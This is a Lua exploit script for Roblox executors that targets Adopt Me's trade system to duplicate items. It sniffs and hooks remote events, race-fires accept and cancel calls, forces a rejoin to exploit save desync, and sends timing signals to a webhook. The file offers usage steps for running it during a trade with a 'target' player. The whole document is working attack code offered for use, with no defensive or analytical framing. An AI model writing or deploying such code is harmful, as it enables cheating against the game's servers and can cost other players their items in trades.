-- Lua | Roblox Executor | Adopt Me Trade Race Framework
-- executor: Synapse X / Solara / Script-Ware / Fluxus
-- target: Adopt Me (Roblox) trade system
-- technique: RemoteEvent race condition on trade accept/cancel

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

----------------------------------------------------------------------
-- 1. REMOTE EVENT SNIFFER
--    Adopt Me renames remotes every update. this dumps all of them
--    so you can find the current trade-related ones.
----------------------------------------------------------------------

local function sniff_remotes()
    local found = {}

    local function scan(parent, depth)
        if depth > 6 then return end
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(found, {
                    name = child.Name,
                    class = child.ClassName,
                    path = child:GetFullName()
                })
            end
            scan(child, depth + 1)
        end
    end

    scan(ReplicatedStorage, 0)
    scan(game:GetService("Workspace"), 0)

    -- filter trade-related keywords
    local trade_keywords = {
        "trade", "Trade", "offer", "Offer", "accept", "Accept",
        "confirm", "Confirm", "exchange", "Exchange", "inventory",
        "Inventory", "pet", "Pet", "item", "Item", "give", "Give"
    }

    local trade_remotes = {}
    for _, remote in ipairs(found) do
        for _, kw in ipairs(trade_keywords) do
            if string.find(remote.name, kw) or string.find(remote.path, kw) then
                table.insert(trade_remotes, remote)
                break
            end
        end
    end

    print("====== ADOPT ME REMOTE DUMP ======")
    print("total remotes: " .. #found)
    print("trade-related: " .. #trade_remotes)
    print("==================================")

    for _, r in ipairs(trade_remotes) do
        print(string.format("[%s] %s → %s", r.class, r.name, r.path))
    end

    return found, trade_remotes
end

----------------------------------------------------------------------
-- 2. REMOTE HOOK / LOGGER
--    intercepts all remote traffic to/from server.
--    run this during a normal trade to capture the exact fire sequence.
----------------------------------------------------------------------

local old_namecall
old_namecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if (method == "FireServer" or method == "InvokeServer") and
       (self:IsA("RemoteEvent") or self:IsA("RemoteFunction")) then

        -- log it
        local arg_str = ""
        for i, v in ipairs(args) do
            arg_str = arg_str .. tostring(v) .. ", "
        end

        print(string.format(
            "[HOOK] %s:%s(%s) → %s",
            method, self.Name, arg_str, self:GetFullName()
        ))
    end

    return old_namecall(self, ...)
end)

----------------------------------------------------------------------
-- 3. TRADE RACE CONDITION ENGINE
--    after you identify the accept/confirm remotes from the logger,
--    plug their paths here.
----------------------------------------------------------------------

-- FILL: run sniff_remotes() + do a test trade with logger on.
--        paste the exact remote paths below.
local TRADE_ACCEPT_PATH = "" -- e.g. "ReplicatedStorage.Events.TradeAccept"
local TRADE_CANCEL_PATH = "" -- e.g. "ReplicatedStorage.Events.TradeCancel"

local function resolve_remote(path_str)
    local obj = game
    for part in string.gmatch(path_str, "[^%.]+") do
        obj = obj:FindFirstChild(part)
        if not obj then
            warn("remote not found: " .. path_str)
            return nil
        end
    end
    return obj
end

local function race_fire(accept_remote, cancel_remote, trade_args, rounds)
    rounds = rounds or 15

    if not accept_remote or not cancel_remote then
        warn("remotes not resolved — run sniffer first")
        return
    end

    -- technique: rapid-fire accept then cancel in tight loop
    -- goal: server processes accept for both sides before cancel registers
    -- timing window is sub-frame, so we spam coroutines

    for i = 1, rounds do
        coroutine.wrap(function()
            accept_remote:FireServer(unpack(trade_args or {}))
        end)()

        -- stagger cancel by 1 tick
        if i % 3 == 0 then
            coroutine.wrap(function()
                cancel_remote:FireServer()
            end)()
        end
    end

    -- secondary wave — different timing
    task.defer(function()
        for i = 1, rounds do
            accept_remote:FireServer(unpack(trade_args or {}))
            if i % 2 == 0 then
                task.wait()
            end
        end
    end)

    print("[RACE] fired " .. (rounds * 2) .. " accept + cancel sequence")
end

----------------------------------------------------------------------
-- 4. MULTI-DEVICE SYNC (concept)
--    real dupes historically used 2 accounts trading simultaneously.
--    this sends a webhook to sync timing between two executor instances.
----------------------------------------------------------------------

local HttpService = game:GetService("HttpService")

-- FILL: your sync webhook URL (discord webhook or custom server)
local SYNC_WEBHOOK = ""

local function sync_signal(action)
    if SYNC_WEBHOOK == "" then return end
    pcall(function()
        local payload = HttpService:JSONEncode({
            player = LocalPlayer.Name,
            action = action,
            tick = tick()
        })
        -- note: HttpService:PostAsync blocked in most executors
        -- use syn.request or http_request instead
        (syn and syn.request or http_request or request)({
            Url = SYNC_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
end

----------------------------------------------------------------------
-- 5. SAVE/LOAD EXPLOIT ATTEMPT
--    disconnect during trade acceptance to desync server save state.
--    historically the most reliable dupe vector.
----------------------------------------------------------------------

local function rejoin_exploit(delay_ms)
    delay_ms = delay_ms or 150

    -- fire accept
    local accept = resolve_remote(TRADE_ACCEPT_PATH)
    if accept then
        accept:FireServer()
    end

    -- immediate rejoin after tiny delay — tries to catch save gap
    task.delay(delay_ms / 1000, function()
        TeleportService = game:GetService("TeleportService")
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)

    print("[REJOIN] accepted + teleporting in " .. delay_ms .. "ms")
end

----------------------------------------------------------------------
-- USAGE
----------------------------------------------------------------------

-- step 1: dump remotes
-- sniff_remotes()

-- step 2: do a normal trade with logger running, note the remote paths

-- step 3: set TRADE_ACCEPT_PATH and TRADE_CANCEL_PATH above

-- step 4: start trade with target, then:
-- local accept = resolve_remote(TRADE_ACCEPT_PATH)
-- local cancel = resolve_remote(TRADE_CANCEL_PATH)
-- race_fire(accept, cancel, {}, 20)

-- or try rejoin method:
-- rejoin_exploit(120)

print("[ADOPT ME TRADE RACE] loaded — run sniff_remotes() to start")
